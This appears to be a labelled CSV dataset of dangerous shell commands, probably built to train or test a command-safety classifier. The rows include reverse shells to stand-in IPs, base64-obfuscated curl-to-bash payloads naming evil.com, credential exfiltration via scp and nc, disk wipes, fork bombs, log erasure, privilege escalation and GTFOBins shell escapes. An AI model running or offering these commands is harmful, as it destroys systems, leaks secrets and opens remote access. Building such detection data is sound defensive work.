command,source
scp -r ~/.ssh user@remote:/tmp/keys_backup,synthetic_risky
"tar czf - /var/log | ssh 203.0.113.5 ""cat > logs.tar.gz""",synthetic_risky
rsync -avz /var/www/ backupuser@203.0.113.10:/mnt/backup/,synthetic_risky
scp /etc/shadow user@remote:/tmp/,synthetic_risky
tar -cvf - /home | nc 203.0.113.20 4444,synthetic_risky
rsync -av --delete /home/ user@remote:/mirror/,synthetic_risky
kill -9 $(pgrep python),synthetic_risky
kill -9 -1,synthetic_risky
for pid in $(pgrep node); do kill -9 $pid; done,synthetic_risky
while true; do kill -9 1234; done,synthetic_risky
killall -9 java,synthetic_risky
pkill -9 -f python,synthetic_risky
kill -9 $(pgrep -f nginx),synthetic_risky
for pid in $(pgrep -f worker); do kill -9 $pid; done,synthetic_risky
pkill -9 node,synthetic_risky
kill -9 $(ps -ef | grep java | awk '{print $2}'),synthetic_risky
wget http://example.com/tool.tar.gz && tar xzf tool.tar.gz,synthetic_risky
wget http://example.com/pkg.tar.gz -O - | tar xz -C /opt,synthetic_risky
curl http://example.com/build.tar.gz -o build.tar.gz && tar -xzf build.tar.gz -C /usr/local,synthetic_risky
wget http://198.51.100.5/app.zip && unzip app.zip -d /opt/app,synthetic_risky
curl -O http://example.com/module.tar.gz && tar xf module.tar.gz -C /lib,synthetic_risky
wget http://203.0.113.7/patch.tar.gz -O - | tar x -C /,synthetic_risky
curl http://example.com/plugin.zip -o plugin.zip && unzip -o plugin.zip -d /var/www/plugins,synthetic_risky
wget http://example.com/lib.so.tar.gz && tar xzf lib.so.tar.gz -C /usr/lib,synthetic_risky
curl -L http://example.com/release.tar.gz | tar xz -C /opt/release,synthetic_risky
wget http://example.com/update.tar.gz && tar --overwrite -xzf update.tar.gz -C /etc,synthetic_risky
iptables -F,synthetic_risky
ufw disable,synthetic_risky
systemctl stop firewalld,synthetic_risky
systemctl disable ufw,synthetic_risky
iptables -P INPUT ACCEPT,synthetic_risky
setenforce 0,synthetic_risky
sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config,synthetic_risky
chmod 777 /etc/sudoers,synthetic_risky
usermod -aG sudo guestuser,synthetic_risky
passwd -d root,synthetic_risky
git push --force origin main,synthetic_risky
git reset --hard HEAD~5,synthetic_risky
git clean -fdx,synthetic_risky
git branch -D release,synthetic_risky
history -c,synthetic_risky
unset HISTFILE,synthetic_risky
export HISTSIZE=0,synthetic_risky
truncate -s 0 /var/log/auth.log,synthetic_risky
cat /dev/null > ~/.bash_history,synthetic_risky
shred -n 1 access.log,synthetic_risky
docker run --privileged -v /:/host alpine chroot /host,synthetic_risky
sudo npm install -g some-package,synthetic_risky
sudo pip install package-from-untrusted-source,synthetic_risky
"(crontab -l; echo ""* * * * * curl http://example.com/check.sh | bash"") | crontab -",synthetic_risky
docker run --cap-add=ALL ubuntu bash,synthetic_risky
sudo chmod -R 777 /usr/bin,synthetic_risky
"echo ""user ALL=(ALL) NOPASSWD:ALL"" >> /etc/sudoers",synthetic_risky
"mount -o remount,rw /",synthetic_risky
dd if=/dev/zero of=testfile.img bs=1M count=100,synthetic_risky
mkfs.vfat /dev/sdb1,synthetic_risky
dd if=/dev/zero of=/dev/sda,synthetic_attack
dd if=/dev/urandom of=/dev/sdb bs=1M,synthetic_attack
dd if=/dev/zero of=/dev/nvme0n1,synthetic_attack
dd if=/dev/random of=/dev/sda bs=512 count=1,synthetic_attack
dd if=/dev/zero of=/dev/sda bs=1M count=1000,synthetic_attack
dd if=/dev/zero of=/dev/sdc conv=notrunc,synthetic_attack
dd if=/dev/zero of=/dev/mapper/vg0-root,synthetic_attack
dd if=/dev/urandom of=/dev/sda1,synthetic_attack
dd if=/dev/zero of=/dev/hda,synthetic_attack
dd if=/dev/zero of=/dev/sda bs=4096 count=100000,synthetic_attack
dd if=/dev/zero of=/dev/vda,synthetic_attack
dd if=/dev/random of=/dev/sdb1,synthetic_attack
dd if=/dev/zero of=/dev/sda2,synthetic_attack
dd if=/dev/zero of=/dev/xvda,synthetic_attack
dd if=/dev/urandom of=/dev/sda bs=1M count=500,synthetic_attack
mkfs.ext4 /dev/sda,synthetic_attack
mkfs.ntfs /dev/sdb,synthetic_attack
mkfs -t ext4 /dev/sda1,synthetic_attack
mkfs.xfs /dev/sda,synthetic_attack
mkfs.ext4 /dev/nvme0n1,synthetic_attack
mkfs.vfat /dev/sda,synthetic_attack
mkfs.btrfs /dev/sda1,synthetic_attack
mkfs.ext3 /dev/vda,synthetic_attack
wipefs -a /dev/sda,synthetic_attack
mkfs.ext4 -F /dev/sda1,synthetic_attack
:(){ :|:& };:,synthetic_attack
bomb(){ bomb|bomb& };bomb,synthetic_attack
.(){ .|.& };.,synthetic_attack
perl -e 'fork while fork',synthetic_attack
"python3 -c ""while True: __import__('os').fork()""",synthetic_attack
bash -c ':(){ :|:& };:',synthetic_attack
:(){ : & : & };:,synthetic_attack
while true; do $0 & done,synthetic_attack
:(){ :&:&};:,synthetic_attack
ruby -e 'loop { fork }',synthetic_attack
echo Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZCB8IGJhc2g= | base64 -d | bash,synthetic_attack
curl -s http://example.com/payload.b64 | base64 -d | sh,synthetic_attack
"echo ""d2dldCBodHRwOi8vZXZpbC5jb20vbWFsIC1PIC90bXAvbQ=="" | base64 --decode | bash",synthetic_attack
wget -qO- http://example.com/enc.txt | base64 -d | bash,synthetic_attack
"printf '%s' ""Y3VybCBldmlsLmNvbS9zaGVsbC5zaCB8IHNo"" | base64 -d | sh",synthetic_attack
curl http://198.51.100.9/stage2.b64 -s | base64 -D | bash,synthetic_attack
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAvNDQ0NCAwPiYx | base64 -d | bash,synthetic_attack
cat payload.b64 | base64 -d | bash,synthetic_attack
curl -s http://203.0.113.15/x | base64 -d > /tmp/x.sh && bash /tmp/x.sh,synthetic_attack
"echo ""cm0gLXJmIC8="" | base64 -d | sh",synthetic_attack
curl -s http://example.com/install.sh | bash,synthetic_attack
curl http://example.com/setup.sh | sh,synthetic_attack
wget -qO- http://example.com/init.sh | bash,synthetic_attack
curl -fsSL http://198.51.100.20/run.sh | sudo bash,synthetic_attack
wget -O - http://203.0.113.30/script.sh | sh,synthetic_attack
curl http://evil.example/x.sh | bash -s --,synthetic_attack
bash <(curl -s http://example.com/x.sh),synthetic_attack
sh <(wget -qO- http://example.com/x.sh),synthetic_attack
curl -sSL http://example.com/miner.sh | bash,synthetic_attack
wget http://example.com/dropper.sh -O- | bash,synthetic_attack
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,gtfobins
vim -c ':!/bin/sh',gtfobins
"awk 'BEGIN {system(""/bin/sh"")}'",gtfobins
find . -exec /bin/sh \; -quit,gtfobins
"python3 -c ""import os; os.system('/bin/sh')""",gtfobins
tar czf archive.tar.gz --use-compress-program=/bin/sh,gtfobins
"vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")' ",gtfobins
"awk 'BEGIN {system(""id"")}'",gtfobins
"find / -name ""*.conf"" -exec /bin/sh -p \; -quit",gtfobins
"perl -e 'exec ""/bin/sh"";'",gtfobins
less /etc/passwd -e '!/bin/sh',gtfobins
nmap --interactive,gtfobins
"python3 -c ""import pty; pty.spawn('/bin/sh')""",gtfobins
env /bin/sh,gtfobins
tar -xf archive.tar --to-command=/bin/sh,gtfobins
rm -rf /,synthetic_attack
rm -rf --no-preserve-root /,synthetic_attack
rm -rf /etc,synthetic_attack
rm -rf /boot,synthetic_attack
rm -rf /var,synthetic_attack
rm -rf /usr,synthetic_attack
rm -rf /*,synthetic_attack
sudo rm -rf /,synthetic_attack
rm -rf / --no-preserve-root,synthetic_attack
chmod -R 777 /,synthetic_attack
nc -e /bin/sh 203.0.113.50 4444,synthetic_attack
bash -i >& /dev/tcp/203.0.113.50/4444 0>&1,synthetic_attack
"python3 -c ""import socket,subprocess,os;s=socket.socket();s.connect(('203.0.113.50',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])""",synthetic_attack
mkfifo /tmp/f; nc 203.0.113.50 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1,synthetic_attack
ncat 203.0.113.50 4444 -e /bin/bash,synthetic_attack
"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:203.0.113.50:4444",synthetic_attack
"php -r '$sock=fsockopen(""203.0.113.50"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");' ",synthetic_attack
rm -rf / && history -c,synthetic_attack
curl -s http://203.0.113.99/wipe.sh | bash,synthetic_attack
dd if=/dev/zero of=/dev/sda bs=1M && reboot -f,synthetic_attack
